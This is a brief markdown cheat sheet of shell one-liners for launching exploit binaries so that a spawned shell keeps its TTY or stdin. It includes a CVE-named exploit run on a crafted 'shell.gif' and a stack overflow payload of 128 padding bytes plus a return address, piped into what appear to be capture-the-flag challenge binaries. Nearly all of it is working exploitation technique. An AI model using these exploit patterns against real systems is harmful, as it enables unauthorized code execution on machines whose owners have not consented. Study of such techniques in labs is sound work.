# File argument
## Reads from stdin, gives TTY to vuln binary
```shell
cat - | ./CVE-2025-6660_4 shell.gif ↑ stdin gets TTY 
```

## Force TTY on stdin/stdout
```shell
./CVE-2025-6660_4 shell.gif < /dev/tty #TTY stdin
```

## Background vuln, fg with TTY
```shell
(./CVE-2025-6660_4 shell.gif < /dev/tty & ) && fg
```

# File stdin

## Keep stdin open for shell
````shell
( python -c "print 'A'*128+'\x64\x84\x04\x08'"; cat -) | ./ch15
( cat payload.txt; cat -) | ./vulnerable_stack_ret2win
```